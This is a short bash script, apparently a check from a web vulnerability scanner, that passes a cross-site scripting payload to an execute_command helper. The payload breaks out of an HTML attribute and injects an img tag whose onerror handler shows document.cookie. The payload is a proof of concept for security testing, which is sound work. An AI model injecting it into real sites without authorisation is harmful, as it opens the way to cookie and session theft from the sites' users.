#!/bin/bash

: '
simpel xss check with a img onerror
'

execute_command "#\"><img src=/ onerror=alert(document.cookie)>"
